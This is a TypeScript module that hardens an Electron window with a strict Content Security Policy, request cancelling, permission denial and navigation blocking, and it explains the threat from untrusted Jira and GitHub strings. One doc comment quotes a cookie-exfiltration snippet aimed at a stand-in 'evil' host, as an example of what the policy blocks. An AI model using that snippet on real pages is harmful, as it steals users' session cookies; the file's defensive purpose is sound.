import type { Session, WebContents } from 'electron'

/**
 * The window's posture toward the network, in one file.
 *
 * The renderer displays strings that arrived from Jira and GitHub — summaries,
 * branch names, PR titles, note bodies written by agents. Any of them can
 * contain markup. The defences here assume one of them will one day be rendered
 * somewhere unescaped, and are arranged so that even then nothing leaves the
 * machine:
 *
 * - **No remote code, ever.** `script-src 'self'` with no `unsafe-inline` and no
 *   `unsafe-eval`. An injected `<script src="https://…">` has nowhere to load
 *   from.
 * - **No exfiltration channel.** `connect-src 'none'` and `img-src 'self' data:`.
 *   Even a successful injection cannot beacon out, because the classic
 *   escape — `new Image().src = 'https://evil/?' + document.cookie` — is a
 *   blocked load. Provider avatars are deliberately not fetched; the design
 *   uses initials, so nothing on this page has any reason to reach the network.
 * - **No navigation away.** The window shows one local page for its whole life.
 *   Every link opens in the operator's browser through `links.ts`, which is the
 *   only code that may hand a URL to the OS.
 *
 * `frame-ancestors 'none'` and `object-src 'none'` close the two remaining
 * embedding routes. `base-uri 'none'` stops an injected `<base>` re-pointing
 * every relative URL on the page at somewhere else.
 */
export const CONTENT_SECURITY_POLICY = [
  "default-src 'none'",
  "script-src 'self'",
  // Styles are bundled to a file, but React inline-styles a handful of computed
  // values (a gauge width, a lane height). `unsafe-inline` here covers the
  // `style` attribute only; it grants nothing to `script-src`.
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data:",
  "font-src 'self'",
  "connect-src 'none'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "frame-ancestors 'none'",
].join('; ')

/**
 * Which URLs the window is allowed to load at all.
 *
 * There is no dev server, on purpose. The renderer is built to disk and loaded
 * over `file:` in development exactly as in production, so this predicate is the
 * same in both — and a CSP that only holds when packaged is a CSP nobody has
 * tested.
 */
export function isAllowedRequest(url: string): boolean {
  return url.startsWith('file://') || url.startsWith('devtools://')
}

/** The window never navigates. Anything asking it to is either a bug or an attack. */
export function isAllowedNavigation(current: string, target: string): boolean {
  return target === current
}

export function applySecurity(session: Session): void {
  session.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [CONTENT_SECURITY_POLICY],
        'X-Content-Type-Options': ['nosniff'],
      },
    })
  })

  // The CSP is the specification; this is the enforcement that does not depend
  // on the renderer honouring a header. Chromium has had CSP bypasses; it has
  // not had "loaded a URL the browser process cancelled".
  session.webRequest.onBeforeRequest((details, callback) => {
    callback({ cancel: !isAllowedRequest(details.url) })
  })

  // Nothing on this page needs the camera, the microphone, notifications, or the
  // clipboard. Denying by default means a new Chromium permission arriving in a
  // future Electron is denied too, rather than inheriting a permissive default.
  session.setPermissionRequestHandler((_contents, _permission, callback) => callback(false))
  session.setPermissionCheckHandler(() => false)
}

export function hardenWebContents(contents: WebContents): void {
  // Every external link goes through `links.ts`, which resolves it via core.
  // A new window opened by the page itself would bypass that entirely.
  contents.setWindowOpenHandler(() => ({ action: 'deny' }))

  contents.on('will-navigate', (event, url) => {
    if (!isAllowedNavigation(contents.getURL(), url)) event.preventDefault()
  })

  contents.on('will-attach-webview', (event) => event.preventDefault())
}
